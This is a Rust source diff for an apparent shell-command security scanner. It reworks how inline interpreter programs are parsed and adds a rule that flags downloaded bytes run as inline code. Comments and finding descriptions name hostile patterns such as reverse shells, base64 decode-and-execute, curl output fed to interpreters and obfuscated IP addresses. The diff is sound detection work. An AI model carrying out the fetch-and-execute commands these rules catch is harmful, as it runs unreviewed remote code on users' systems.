@@ -2101,6 +2101,144 @@ fn resolve_effective_command_with_environment(
     Err(EffectiveCommandError::WrapperChainTooDeep)
 }
 
+fn interpreter_inline_options(interpreter: &str) -> &'static [&'static str] {
+    match interpreter {
+        "php" => &["-r"],
+        "node" | "nodejs" | "bun" => &["-pe", "-e", "--eval", "-p", "--print"],
+        "perl" => &["-e", "-E"],
+        "ruby" | "deno" | "lua" => &["-e"],
+        "python" | "python2" | "python3" | "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish"
+        | "csh" | "tcsh" | "ash" | "mksh" | "pwsh" => &["-c"],
+        _ => &[],
+    }
+}
+
+/// Node options that take the next word as their value (V8 options such as
+/// `--stack-size` accept the same spelling).
+const NODE_VALUE_OPTIONS: &[&str] = &[
+    "-e",
+    "--eval",
+    "-p",
+    "--print",
+    "-r",
+    "--require",
+    "--loader",
+    "--experimental-loader",
+    "--import",
+    "-C",
+    "--conditions",
+    "--input-type",
+    "--title",
+    "--inspect-port",
+    "--debug-port",
+    "--stack-size",
+    "--max-old-space-size",
+    "--max-semi-space-size",
+    "--env-file",
+    "--env-file-if-exists",
+    "--disable-warning",
+    "--unhandled-rejections",
+    "--redirect-warnings",
+    "--icu-data-dir",
+    "--openssl-config",
+    "--diagnostic-dir",
+    "--report-dir",
+    "--report-directory",
+    "--report-filename",
+    "--report-signal",
+    "--dns-result-order",
+    "--heapsnapshot-signal",
+    "--secure-heap",
+    "--secure-heap-min",
+    "--tls-cipher-list",
+    "--tls-keylog",
+    "--trace-event-categories",
+    "--trace-event-file-pattern",
+    "--watch-path",
+    "--cpu-prof-dir",
+    "--cpu-prof-name",
+    "--heap-prof-dir",
+    "--heap-prof-name",
+    "--test-reporter",
+    "--test-reporter-destination",
+    "--test-name-pattern",
+    "--test-skip-pattern",
+    "--localstorage-file",
+    "--snapshot-blob",
+    "--experimental-config-file",
+    "--experimental-default-type",
+    "--experimental-test-isolation",
+    "--experimental-sea-config",
+    "--experimental-policy",
+    "--experimental-specifier-resolution",
+    "--run",
+];
+
+const BUN_VALUE_OPTIONS: &[&str] = &[
+    "-e",
+    "--eval",
+    "-p",
+    "--print",
+    "-r",
+    "--require",
+    "--preload",
+    "--import",
+    "--loader",
+    "-l",
+    "--cwd",
+    "-c",
+    "--config",
+    "--env-file",
+    "--tsconfig-override",
+    "-d",
+    "--define",
+    "--port",
+    "--conditions",
+    "--main-fields",
+    "--extension-order",
+    "--jsx-factory",
+    "--jsx-fragment",
+    "--jsx-import-source",
+    "--jsx-runtime",
+    "-F",
+    "--filter",
+    "--elide-lines",
+    "--title",
+];
+
+fn interpreter_value_options(interpreter: &str) -> &'static [&'static str] {
+    match interpreter {
+        "python" | "python2" | "python3" => &["-W", "-X", "-Q", "-m", "--check-hash-based-pycs"],
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "csh" | "tcsh" | "ash" | "mksh" => {
+            &["-o", "-O"]
+        }
+        "node" | "nodejs" | "deno" => NODE_VALUE_OPTIONS,
+        "bun" => BUN_VALUE_OPTIONS,
+        "perl" => &["-e", "-E", "-I", "-M", "-m"],
+        "ruby" => &[
+            "-e",
+            "-I",
+            "-r",
+            "-C",
+            "-E",
+            "--encoding",
+            "--external-encoding",
+            "--internal-encoding",
+            "--enable",
+            "--disable",
+            "--dump",
+            "--backtrace-limit",
+            "--crash-report",
+            "--parser",
+        ],
+        "php" => &["-r", "-d", "-c"],
+        "lua" => &["-e", "-l"],
+        "rscript" => &["-e", "--file"],
+        "pwsh" | "iex" | "invoke-expression" => &["-c", "-Command", "-File"],
+        _ => &[],
+    }
+}
+
 /// Return the concrete file operands an interpreter will execute. Inline-code
 /// and module modes consume their values without misclassifying option values
 /// (`python -W ignore script.py`), while preload options are retained as
@@ -2119,31 +2257,16 @@ pub(crate) fn interpreter_script_operands(
         return Ok((effective, Vec::new()));
     }
 
-    let value_options: &[&str] = match base.as_str() {
-        "python" | "python2" | "python3" => &["-W", "-X", "-Q", "-m", "--check-hash-based-pycs"],
-        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "csh" | "tcsh" | "ash" | "mksh" => {
-            &["-o", "-O"]
-        }
-        "node" | "nodejs" | "deno" | "bun" => {
-            &["-e", "--eval", "-p", "--print", "--loader", "--import"]
-        }
-        "perl" => &["-e", "-E", "-I", "-M", "-m"],
-        "ruby" => &["-e", "-I", "-r"],
-        "php" => &["-r", "-d", "-c"],
-        "lua" => &["-e", "-l"],
-        "rscript" => &["-e", "--file"],
-        "pwsh" | "iex" | "invoke-expression" => &["-c", "-Command", "-File"],
-        _ => &[],
-    };
-    let inline_options: &[&str] = match base.as_str() {
-        "php" => &["-r"],
-        "perl" | "ruby" | "node" | "nodejs" | "deno" | "bun" | "lua" => &["-e"],
-        "python" | "python2" | "python3" | "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish"
-        | "csh" | "tcsh" | "ash" | "mksh" | "pwsh" => &["-c"],
-        _ => &[],
-    };
+    let value_options = interpreter_value_options(&base);
+    let inline_options = interpreter_inline_options(&base);
     let file_value_options: &[&str] = match base.as_str() {
-        "node" | "nodejs" | "deno" | "bun" => &["-r", "--require", "--loader", "--import"],
+        "node" | "nodejs" | "deno" | "bun" => &[
+            "-r",
+            "--require",
+            "--loader",
+            "--experimental-loader",
+            "--import",
+        ],
         "ruby" => &["-r"],
         "lua" => &["-l"],
         "rscript" => &["--file"],
@@ -4329,7 +4452,13 @@ fn check_host_for_network_issues(arg: &str, client: &str, findings: &mut Vec<Fin
             // running what a LAN host serves is judged by the pipe/exec rules.
             // An address spelled any other way (`0xC0A80114`, `3232235796`,
             // curl's empty-hex numeric reading) is obfuscation: High.
-            let severity = if crate::rules::shared::raw_destination_spells_host(arg, &host) {
+            let normalized = (client == "curl")
+                .then(|| crate::parse::normalize_curl_url(arg))
+                .flatten();
+            let severity = if crate::rules::shared::raw_destination_spells_host(
+                normalized.as_deref().unwrap_or(arg),
+                &host,
+            ) {
                 Severity::Medium
             } else {
                 Severity::High
@@ -4497,7 +4626,9 @@ fn check_network_destination(
             let mut budget = crate::extract::MAX_CURL_GLOB_EXPANSIONS_PER_COMMAND;
             for operand in curl_url_operands(&args, shell) {
                 match curl_operand_hosts(&args, &operand, shell, &mut budget) {
-                    CurlOperandHosts::Plain => {}
+                    CurlOperandHosts::Plain => {
+                        check_host_for_network_issues(&operand.text, "curl", findings);
+                    }
                     CurlOperandHosts::Expanded(expansions) => {
                         for expansion in expansions {
                             check_host_for_network_issues(&expansion, "curl", findings);
@@ -4508,6 +4639,7 @@ fn check_network_destination(
                     }
                 }
             }
+            continue;
         }
 
         for arg in &args {
@@ -5709,7 +5841,7 @@ fn check_base64_decode_execute(
 /// into a shell is `pipe_to_interpreter`, and `powershell -Command` inline is
 /// owned by `rules::powershell`.
 const INLINE_CODE_INTERPRETERS: &[&str] = &[
-    "python", "python2", "python3", "perl", "ruby", "php", "node", "bun",
+    "python", "python2", "python3", "perl", "ruby", "php", "node", "nodejs", "bun",
 ];
 
 fn is_inline_code_interpreter(name: &str) -> bool {
@@ -5936,9 +6068,9 @@ fn check_reverse_shell(
     }
 }
 
-/// Inline-interpreter suspicious exec (PR3): an inline-code interpreter
-/// (`python -c` / `node -e` / …) whose body carries a suspicious payload. Fires
-/// ONLY on (inline form) AND (payload indicator), never on a benign one-liner.
+/// Inline source that carries a suspicious primitive or receives downloaded
+/// bytes from a live command substitution. Literal programs and substitutions
+/// in ordinary data argv do not establish an execution relation.
 /// The base64 decode-execute shape stays owned by [`check_base64_decode_execute`].
 fn check_interpreter_suspicious_inline_exec(
     segments: &[tokenize::Segment],
@@ -5969,34 +6101,77 @@ fn check_interpreter_suspicious_inline_exec(
             continue;
         };
 
-        let Some(body) = extract_inline_program(&effective.args, &interpreter, shell) else {
-            continue;
-        };
+        // A word list the dataflow splitter cannot read (a trailing
+        // backslash) falls back to the tokenizer's argv rather than skipping
+        // the rule. Redirections are not interpreter argv.
+        let args =
+            dataflow_segment_args(&effective, shell).unwrap_or_else(|()| effective.args.clone());
+        let args = crate::escalation::args_without_redirections(&args);
+        let programs = extract_inline_programs(&args, &interpreter, shell);
+        // The program released versions read is a floor for the payload
+        // check, and an argv the role parser cannot classify falls back to the
+        // first inline option anywhere.
+        let floor = [
+            find_released_inline_program(&args, &interpreter, shell),
+            if programs.is_empty() {
+                find_inline_program_anywhere(&args, &interpreter, shell)
+            } else {
+                None
+            },
+        ];
 
         // Base64 decode-execute is reported by check_base64_decode_execute.
-        if is_base64_decode_exec_body(&body.to_lowercase()) {
-            continue;
-        }
-        let payload_matches = if interpreter == "php" {
-            SUSPICIOUS_INLINE_PAYLOAD_RE.is_match(&body.to_ascii_lowercase())
-        } else {
-            SUSPICIOUS_INLINE_PAYLOAD_RE.is_match(&body)
-        };
-        if !payload_matches {
+        let owned_elsewhere = |source: &str| is_base64_decode_exec_body(&source.to_lowercase());
+        let downloaded_program = shell == ShellType::Posix
+            && programs.iter().any(|program| {
+                !owned_elsewhere(&program.source)
+                    && program.raw_word.contains(['$', '`'])
+                    && parse_posix_shell_word(program.raw_word)
+                        .substitutions
+                        .iter()
+                        .any(|substitution| substitution_emits_download(&substitution.body, 0))
+            });
+        let payload_matches = programs
+            .iter()
+            .chain(floor.iter().flatten())
+            .map(|program| program.source.as_str())
+            .filter(|source| !owned_elsewhere(source))
+            .any(|source| {
+                if interpreter == "php" {
+                    SUSPICIOUS_INLINE_PAYLOAD_RE.is_match(&source.to_ascii_lowercase())
+                } else {
+                    SUSPICIOUS_INLINE_PAYLOAD_RE.is_match(source)
+                }
+            });
+        if !payload_matches && !downloaded_program {
             continue;
         }
 
         findings.push(Finding {
             rule_id: RuleId::InterpreterSuspiciousInlineExec,
             severity: Severity::High,
-            title: format!("Inline interpreter with suspicious payload: {interpreter}"),
-            description:
+            title: if downloaded_program {
+                format!("Downloaded code passed to inline interpreter: {interpreter}")
+            } else {
+                format!("Inline interpreter with suspicious payload: {interpreter}")
+            },
+            description: if downloaded_program {
+                "A live command substitution supplies downloaded bytes as the interpreter's \
+                 inline program. Download to a file and inspect the code before executing it."
+                    .to_string()
+            } else {
                 "An inline interpreter invocation runs code that spawns a process, opens a \
                  socket, or dynamically executes code. Inline payloads hide from file-based \
                  review; write the code to a file and inspect it before running."
-                    .to_string(),
+                    .to_string()
+            },
             evidence: vec![Evidence::CommandPattern {
-                pattern: "inline interpreter suspicious payload".to_string(),
+                pattern: if downloaded_program {
+                    "downloaded bytes as inline interpreter source"
+                } else {
+                    "inline interpreter suspicious payload"
+                }
+                .to_string(),
                 matched: redact::redact_shell_assignments(&seg.raw),
             }],
             human_view: None,
@@ -6007,34 +6182,721 @@ fn check_interpreter_suspicious_inline_exec(
     }
 }
 
-/// Extract the program supplied to an interpreter's inline-code option. Both
-/// separate (`-e CODE`) and attached (`-eCODE`) forms are accepted, but only for
-/// options that the resolved interpreter actually treats as inline source.
-fn extract_inline_program(args: &[String], interpreter: &str, shell: ShellType) -> Option<String> {
-    let flags: &[&str] = match interpreter {
-        "php" => &["-r"],
-        "perl" | "ruby" | "node" | "deno" | "bun" | "lua" => &["-e"],
-        "python" | "python2" | "python3" | "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish"
-        | "csh" | "tcsh" | "ash" | "mksh" | "pwsh" => &["-c"],
-        _ => &["-c", "-e", "-r"],
-    };
+struct InlineProgram<'a> {
+    source: String,
+    raw_word: &'a str,
+}
 
-    for (idx, raw) in args.iter().enumerate() {
-        let arg = normalize_shell_token(raw, shell);
-        for flag in flags {
-            if arg == *flag {
-                return args
-                    .get(idx + 1)
-                    .map(|body| normalize_shell_token(body, shell));
+/// How one interpreter argv word is read by the interpreter's own option parser.
+enum InterpreterOptionRole<'a> {
+    /// An inline-code option, with its program (`None` when the value word is
+    /// missing) and the argv words the two occupy.
+    Inline {
+        program: Option<InlineProgram<'a>>,
+        width: usize,
+    },
+    /// Option parsing ends without inline code: `--`, `-`, `python -m`, help or version.
+    Terminal,
+    /// A recognized option that occupies this many argv words.
+    Known(usize),
+    /// An option the grammar does not know, which may consume the next operand.
+    Unknown,
+    /// A script, module or data operand.
+    Operand,
+}
+
+/// Short-option letters of interpreters that accept clustered flags
+/// (`python3 -Bc`, `perl -lne`, `ruby -we`).
+struct ShortOptionCluster {
+    /// Flags without a value.
+    boolean: &'static str,
+    /// Options whose value is the rest of the word, or else the next word.
+    value: &'static str,
+    /// Options whose optional value can only be attached (the rest of the word).
+    attached: &'static str,
+    /// Inline-code options; the program is the rest of the word or the next word.
+    inline: &'static str,
+    /// Options that end option parsing without running inline code.
+    terminal: &'static str,
+}
+
+fn interpreter_short_option_cluster(interpreter: &str) -> Option<ShortOptionCluster> {
+    match interpreter {
+        "python" | "python2" | "python3" => Some(ShortOptionCluster {
+            boolean: "bBdEiIOPqRsSuvx3tU",
+            value: "WXQ",
+            attached: "",
+            inline: "c",
+            terminal: "mhV?",
+        }),
+        // `-l` and `-0` take only digits, which are flags of their own here.
+        "perl" => Some(ShortOptionCluster {
+            boolean: "acgnpsStTuUwWXl0123456789",
+            value: "I",
+            attached: "CDdFiMmx",
+            inline: "eE",
+            terminal: "hvV",
+        }),
+        "ruby" => Some(ShortOptionCluster {
+            boolean: "acdlnpsSUvwWy0123456789",
+            value: "CEIr",
+            attached: "FiKTx",
+            inline: "e",
+            terminal: "h",
+        }),
+        _ => None,
+    }
+}
+
+/// Common no-value options of the interpreters' long and non-clustered
+/// options. Any other unknown option may take the next word as its value.
+fn interpreter_flag_takes_no_value(interpreter: &str, arg: &str) -> bool {
+    match interpreter {
+        "node" | "nodejs" | "bun" => {
+            arg.starts_with("--no-")
+                // Value-taking experimental options are in the value table,
+                // which is consulted first.
+                || arg.starts_with("--experimental-")
+                || matches!(
+                    arg,
+                    "-i" | "-c"
+                        | "-v"
+                        | "-h"
+                        | "-b"
+                        | "--interactive"
+                        | "--check"
+                        | "--inspect"
+                        | "--inspect-brk"
+                        | "--inspect-wait"
+                        | "--watch"
+                        | "--hot"
+                        | "--smol"
+                        | "--bun"
+                        | "--silent"
+                        | "--test"
+                        | "--expose-gc"
+                        | "--trace-warnings"
+                        | "--trace-deprecation"
+                        | "--throw-deprecation"
+                        | "--pending-deprecation"
+                        | "--enable-source-maps"
+                        | "--preserve-symlinks"
+                        | "--preserve-symlinks-main"
+                        | "--abort-on-uncaught-exception"
+                        | "--jitless"
+                        | "--frozen-intrinsics"
+                        | "--zero-fill-buffers"
+                        | "--use-openssl-ca"
+                        | "--use-bundled-ca"
+                        | "--trace-uncaught"
+                        | "--trace-exit"
+                        | "--trace-sync-io"
+                        | "--prof"
+                        | "--cpu-prof"
+                        | "--heap-prof"
+                        | "--permission"
+                        // The remaining no-value options of `node --help`
+                        // (22.x): read as value-taking, they made a script
+                        // name the option's value and its argv look like
+                        // inline code (`node --trace-sigint app.js -e …`).
+                        | "--allow-addons"
+                        | "--allow-child-process"
+                        | "--allow-wasi"
+                        | "--allow-worker"
+                        | "--build-snapshot"
+                        | "--completion-bash"
+                        | "--disable-sigusr1"
+                        | "--disable-wasm-trap-handler"
+                        | "--disallow-code-generation-from-strings"
+                        | "--enable-etw-stack-walking"
+                        | "--enable-fips"
+                        | "--enable-network-family-autoselection"
+                        | "--entry-url"
+                        | "--force-context-aware"
+                        | "--force-fips"
+                        | "--force-node-api-uncaught-exceptions-policy"
+                        | "--huge-max-old-generation-size"
+                        | "--insecure-http-parser"
+                        | "--interpreted-frames-native-stack"
+                        | "--node-memory-debug"
+                        | "--openssl-legacy-provider"
+                        | "--openssl-shared-config"
+                        | "--prof-process"
+                        | "--report-compact"
+                        | "--report-exclude-env"
+                        | "--report-exclude-network"
+                        | "--report-on-fatalerror"
+                        | "--report-on-signal"
+                        | "--report-uncaught-exception"
+                        | "--test-force-exit"
+                        | "--test-only"
+                        | "--test-update-snapshots"
+                        | "--tls-max-v1.2"
+                        | "--tls-max-v1.3"
+                        | "--tls-min-v1.0"
+                        | "--tls-min-v1.1"
+                        | "--tls-min-v1.2"
+                        | "--tls-min-v1.3"
+                        | "--trace-atomics-wait"
+                        | "--trace-env"
+                        | "--trace-env-js-stack"
+                        | "--trace-env-native-stack"
+                        | "--trace-promises"
+                        | "--trace-sigint"
+                        | "--trace-tls"
+                        | "--track-heap-objects"
+                        | "--use-env-proxy"
+                        | "--use-system-ca"
+                        | "--v8-options"
+                        | "--watch-preserve-output"
+                )
+        }
+        "ruby" => {
+            arg.starts_with("--enable-")
+                || arg.starts_with("--disable-")
+                || matches!(
+                    arg,
+                    "--verbose" | "--copyright" | "--yydebug" | "--jit" | "--yjit" | "--rjit"
+                )
+        }
+        _ => false,
+    }
+}
+
+/// Classify `args[index]` by the interpreter's argv grammar, retaining shell
+/// quoting in the selected program word so literal curl text cannot become a
+/// live substitution.
+fn interpreter_option_role<'a>(
+    args: &'a [String],
+    index: usize,
+    interpreter: &str,
+    shell: ShellType,
+) -> InterpreterOptionRole<'a> {
+    let raw = &args[index];
+    let arg = normalize_shell_token(raw, shell);
+    if matches!(arg.as_str(), "--" | "-" | "--help" | "--version") {
+        return InterpreterOptionRole::Terminal;
+    }
+    let next_program = || {
+        args.get(index + 1).map(|raw_word| InlineProgram {
+            source: normalize_shell_token(raw_word, shell),
+            raw_word,
+        })
+    };
+    for flag in interpreter_inline_options(interpreter) {
+        if arg == *flag {
+            return InterpreterOptionRole::Inline {
+                program: next_program(),
+                width: 2,
+            };
+        }
+        let attached = arg.strip_prefix(flag).and_then(|suffix| {
+            if flag.starts_with("--") {
+                suffix.strip_prefix('=')
+            } else {
+                Some(suffix)
             }
-            if let Some(attached) = arg.strip_prefix(flag) {
-                if !attached.is_empty() {
-                    return Some(attached.to_string());
+        });
+        if let Some(source) = attached.filter(|source| !source.is_empty()) {
+            return InterpreterOptionRole::Inline {
+                program: Some(InlineProgram {
+                    source: source.to_string(),
+                    raw_word: raw,
+                }),
+                width: 1,
+            };
+        }
+    }
+    if let Some(cluster) = interpreter_short_option_cluster(interpreter)
+        .filter(|_| arg.len() > 1 && arg.starts_with('-') && !arg.starts_with("--"))
+    {
+        let letters = &arg[1..];
+        for (offset, letter) in letters.char_indices() {
+            let rest = &letters[offset + letter.len_utf8()..];
+            if cluster.inline.contains(letter) {
+                return if rest.is_empty() {
+                    InterpreterOptionRole::Inline {
+                        program: next_program(),
+                        width: 2,
+                    }
+                } else {
+                    InterpreterOptionRole::Inline {
+                        program: Some(InlineProgram {
+                            source: rest.to_string(),
+                            raw_word: raw,
+                        }),
+                        width: 1,
+                    }
+                };
+            }
+            if cluster.terminal.contains(letter) {
+                return InterpreterOptionRole::Terminal;
+            }
+            if cluster.value.contains(letter) {
+                return match (rest.is_empty(), args.get(index + 1)) {
+                    (false, _) => InterpreterOptionRole::Known(1),
+                    (true, Some(_)) => InterpreterOptionRole::Known(2),
+                    (true, None) => InterpreterOptionRole::Terminal,
+                };
+            }
+            if cluster.attached.contains(letter) {
+                return InterpreterOptionRole::Known(1);
+            }
+            if !cluster.boolean.contains(letter) {
+                return InterpreterOptionRole::Unknown;
+            }
+        }
+        return InterpreterOptionRole::Known(1);
+    }
+    let value_options = interpreter_value_options(interpreter);
+    if value_options.contains(&arg.as_str()) {
+        return if args.get(index + 1).is_some() {
+            InterpreterOptionRole::Known(2)
+        } else {
+            InterpreterOptionRole::Terminal
+        };
+    }
+    if value_options.iter().any(|flag| {
+        arg.strip_prefix(flag).is_some_and(|suffix| {
+            if flag.starts_with("--") {
+                suffix.starts_with('=')
+            } else {
+                !suffix.is_empty()
+            }
+        })
+    }) || (arg.starts_with("--") && arg.contains('='))
+        || interpreter_flag_takes_no_value(interpreter, &arg)
+    {
+        return InterpreterOptionRole::Known(1);
+    }
+    if arg.starts_with('-') {
+        InterpreterOptionRole::Unknown
+    } else {
+        InterpreterOptionRole::Operand
+    }
+}
+
+/// Select source by interpreter argv role. Script/module argv and known option
+/// values cannot masquerade as a later inline-code flag. An option the grammar
+/// does not know may consume the next operand as its value (`node --title x -e`),
+/// so option parsing continues past that operand instead of stopping there.
+/// node and bun keep reading options after an inline program and run a later
+/// one (node the last), and perl and ruby run them all, so every one is
+/// returned. Python ends option parsing at `-c` and php refuses a second `-r`,
+/// so only their first program runs.
+fn extract_inline_programs<'a>(
+    args: &'a [String],
+    interpreter: &str,
+    shell: ShellType,
+) -> Vec<InlineProgram<'a>> {
+    let reads_every_program = matches!(interpreter, "node" | "nodejs" | "bun" | "perl" | "ruby");
+    let mut programs = Vec::new();
+    let mut index = 0;
+    while index < args.len() {
+        match interpreter_option_role(args, index, interpreter, shell) {
+            InterpreterOptionRole::Inline {
+                program: Some(program),
+                width,
+            } => {
+                programs.push(program);
+                if !reads_every_program {
+                    break;
+                }
+                index += width;
+            }
+            InterpreterOptionRole::Inline { program: None, .. }
+            | InterpreterOptionRole::Terminal
+            | InterpreterOptionRole::Operand => break,
+            InterpreterOptionRole::Known(width) => index += width,
+            InterpreterOptionRole::Unknown => {
+                index += 1;
+                if args
+                    .get(index)
+                    .is_some_and(|next| !normalize_shell_token(next, shell).starts_with('-'))
+                {
+                    index += 1;
                 }
             }
         }
     }
-    None
+    programs
+}
+
+/// The first inline-code option anywhere in argv, by the role grammar.
+/// Used for the payload check when argv roles select no program, so an argv
+/// spelling the role parser cannot classify never hides a suspicious payload.
+fn find_inline_program_anywhere<'a>(
+    args: &'a [String],
+    interpreter: &str,
+    shell: ShellType,
+) -> Option<InlineProgram<'a>> {
+    (0..args.len()).find_map(|index| {
+        match interpreter_option_role(args, index, interpreter, shell) {
+            InterpreterOptionRole::Inline { program, .. } => program,
+            _ => None,
+        }
+    })
+}
+
+/// The program released versions checked: the first word anywhere in argv that
+/// is, or starts with, the one inline flag they knew for the interpreter. A
+/// flag the role grammar reads first (`node -p 1 -e …`, `perl -le … -e …`)
+/// cannot hide a payload that a released version caught.
+fn find_released_inline_program<'a>(
+    args: &'a [String],
+    interpreter: &str,
+    shell: ShellType,
+) -> Option<InlineProgram<'a>> {
+    let flag = match interpreter {
+        "php" => "-r",
+        "python" | "python2" | "python3" => "-c",
+        _ => "-e",
+    };
+    args.iter()
+        .enumerate()
+        .find_map(|(index, raw)| {
+            let arg = normalize_shell_token(raw, shell);
+            if arg == flag {
+                return Some(args.get(index + 1).map(|raw_word| InlineProgram {
+                    source: normalize_shell_token(raw_word, shell),
+                    raw_word,
+                }));
+            }
+            let source = arg.strip_prefix(flag).filter(|source| !source.is_empty())?;
+            Some(Some(InlineProgram {
+                source: source.to_string(),
+                raw_word: raw,
+            }))
+        })
+        .flatten()
+}
+
+/// File names that write to the process's own standard output.
+fn names_standard_output(path: &str) -> bool {
+    matches!(path, "/dev/stdout" | "/dev/fd/1" | "/proc/self/fd/1")
+}
+
+/// One curl transfer: a URL and an output instruction each fill the first
+/// transfer still lacking one, and a transfer keeps the `--remote-name-all`
+/// default in effect when it was created, so the option does not reach URLs
+/// given before it.
+struct CurlTransfer {
+    url: bool,
+    /// `Some(true)` writes to stdout, `Some(false)` to a file.
+    output: Option<bool>,
+    remote_name: bool,
+}
+
+#[derive(Default)]
+struct CurlTransferOutputs {
+    transfers: Vec<CurlTransfer>,
+    next_url: usize,
+    next_output: usize,
+    remote_name_all: bool,
+    /// A `-K` config file can add URLs whose output argv cannot show.
+    config: bool,
+}
+
+impl CurlTransferOutputs {
+    fn transfer_at(&mut self, index: usize) -> &mut CurlTransfer {
+        if index == self.transfers.len() {
+            self.transfers.push(CurlTransfer {
+                url: false,
+                output: None,
+                remote_name: self.remote_name_all,
+            });
+        }
+        &mut self.transfers[index]
+    }
+
+    fn url(&mut self) {
+        self.transfer_at(self.next_url).url = true;
+        self.next_url += 1;
+    }
+
+    fn output(&mut self, stdout: bool) {
+        self.transfer_at(self.next_output).output = Some(stdout);
+        self.next_output += 1;
+    }
+
+    fn emits_stdout(&self) -> bool {
+        self.config
+            || self
+                .transfers
+                .iter()
+                .any(|transfer| transfer.url && transfer.output.unwrap_or(!transfer.remote_name))
+    }
+}
+
+#[derive(Clone, Copy)]
+enum CurlTransferValue {
+    Url,
+    Output { expanded: bool },
+    Config,
+    Other,
+}
+
+fn curl_transfer_value(
+    group: &mut CurlTransferOutputs,
+    role: CurlTransferValue,
+    raw: &str,
+    value: &str,
+    value_start: usize,
+) {
+    match role {
+        CurlTransferValue::Url => {
+            if !value.is_empty() {
+                group.url();
+            }
+        }
+        CurlTransferValue::Output { expanded } => {
+            // Literal and bounded pure-substitution filenames can prove file
+            // routing. Unknown shell/curl expansion can still choose "-".
+            let literal = command_word_is_statically_bound(raw, ShellType::Posix)
+                && (!raw.contains('`') || parse_posix_shell_word(raw).substitutions.is_empty());
+            let stdout = if literal {
+                value == "-" || names_standard_output(value)
+            } else {
+                evaluated_literal(raw, ShellType::Posix).map_or(true, |resolved| {
+                    resolved.contains(['*', '?', '[', '{'])
+                        || resolved
+                            .get(value_start..)
+                            .is_none_or(|target| target == "-" || names_standard_output(target))
+                })
+            };
+            group.output(stdout || (expanded && value.contains("{{")));
+        }
+        CurlTransferValue::Config => group.config = true,
+        CurlTransferValue::Other => {}
+    }
+}
+
+/// curl pairs the nth output instruction with the nth requested URL in each
+/// --next group, regardless of their relative positions in argv. Auxiliary
+/// network peers never occupy URL slots, -O is not --remote-name-all, and
+/// --remote-name-all applies only to transfers created after it.
+fn curl_emits_download(args: &[String]) -> bool {
+    let mut group = CurlTransferOutputs::default();
+    let mut completed_stdout = false;
+    let mut pending = None;
+    let mut options_terminated = false;
+    for raw in &crate::escalation::args_without_redirections(args) {
+        let arg = normalize_shell_token(raw, ShellType::Posix);
+        if let Some(role) = pending.take() {
+            curl_transfer_value(&mut group, role, raw, &arg, 0);
+            continue;
+        }
+        if !options_terminated && arg == "--" {
+            options_terminated = true;
+            continue;
+        }
+        if !options_terminated && arg.starts_with("--") {
+            let (spelling, _) = split_attached_option(&arg, '=');
+            match spelling {
+                "--next" => {
+                    completed_stdout |= group.emits_stdout();
+                    group = CurlTransferOutputs::default();
+                }
+                "--remote-name" => group.output(false),
+                "--no-remote-name" => group.output(true),
+                "--remote-name-all" => group.remote_name_all = true,
+                "--no-remote-name-all" => group.remote_name_all = false,
+                "--help" | "--version" => return false,
+                _ => {
+                    // The canonical option grammar owns all value-taking
+                    // roles, including unrelated long flags such as -A's
+                    // --user-agent spelling. Their values cannot become flags.
+                    if let Some(option) = fetch_option_value("curl", &arg) {
+                        let name = spelling
+                            .strip_prefix(CURL_EXPAND_OPTION_PREFIX)
+                            .or_else(|| spelling.strip_prefix("--"))
+                            .unwrap_or(spelling);
+                        let role = match name {
+                            "url" => CurlTransferValue::Url,
+                            "output" => CurlTransferValue::Output {
+                                expanded: spelling.starts_with(CURL_EXPAND_OPTION_PREFIX),
+                            },
+                            "config" => CurlTransferValue::Config,
+                            _ => CurlTransferValue::Other,
+                        };
+                        if let Some(value) = option.attached {
+                            curl_transfer_value(
+                                &mut group,
+                                role,
+                                raw,
+                                value,
+                                arg.len() - value.len(),
+                            );
+                        } else {
+                            pending = Some(role);
+                        }
+                    }
+                }
+            }
+            continue;
+        }
+        if !options_terminated && arg.starts_with('-') && arg != "-" {
+            let value_option = fetch_option_value("curl", &arg);
+            // The same canonical parser identifies the first value-taking
+            // short flag. Everything after that letter is its attached value,
+            // not more flags (`-A-o/tmp/file` is user-agent data).
+            let value_end = value_option
+                .and_then(|option| option.attached)
+                .map_or(arg.len(), |value| arg.len() - value.len());
+            for flag in arg[1..value_end].chars() {
+                match flag {
+                    'O' => group.output(false),
+                    ':' => {
+                        completed_stdout |= group.emits_stdout();
+                        group = CurlTransferOutputs::default();
+                    }
+                    'h' | 'V' => return false,
+                    _ => {}
+                }
+            }
+            if let Some(option) = value_option {
+                let role = match arg.as_bytes()[value_end - 1] {
+                    b'o' => CurlTransferValue::Output { expanded: false },
+                    b'K' => CurlTransferValue::Config,
+                    _ => CurlTransferValue::Other,
+                };
+                if let Some(value) = option.attached {
+                    curl_transfer_value(&mut group, role, raw, value, value_end);
+                } else {
+                    pending = Some(role);
+                }
+            }
+            continue;
+        }
+        group.url();
+    }
+    completed_stdout || group.emits_stdout()
+}
+
+fn fetch_emits_download(command: &str, args: &[String]) -> bool {
+    if command == "curl" {
+        return curl_emits_download(args);
+    }
+    if !POSIX_FETCH_COMMANDS.contains(&command)
+        || url_fetch_destination_operands(command, args, ShellType::Posix).is_empty()
+    {
+        return false;
+    }
+    let (long, short, value_options) = match command {
+        "wget" => ("--output-document", 'O', "aABeIiIloPQRTtUuwWX"),
+        "fetch" => ("--output", 'o', "oTtw"),
+        _ => ("--output", 'o', "a"),
+    };
+    let outputs = crate::rules::install::collect_command_option_values(
+        args,
+        ShellType::Posix,
+        long,
+        short,
+        value_options,
+    );
+    let mut pending_value = false;
+    for raw in args {
+        let arg = normalize_shell_token(raw, ShellType::Posix);
+        if pending_value {
+            pending_value = false;
+            continue;
+        }
+        if arg == "--" {
+            break;
+        }
+        if !arg.starts_with('-') {
+            continue;
+        }
+        if let Some(option) = fetch_option_value(command, &arg) {
+            pending_value = option.attached.is_none();
+            continue;
+        }
+        if matches!(arg.as_str(), "--help" | "--version" | "--spider") {
+            return false;
+        }
+    }
+    if outputs
+        .iter()
+        .any(|output| output == "-" || names_standard_output(output))
+    {
+        return true;
+    }
+    match command {
+        "wget" | "fetch" => false,
+        _ => outputs.is_empty(),
+    }
+}
+
+/// Download provenance through the existing wrapper, descriptor, and bounded
+/// executable-body resolvers. Only stdout reaching the selected source word
+/// matters; a fetch printed as text or redirected to a file is not executable.
+fn substitution_emits_download(body: &str, depth: usize) -> bool {
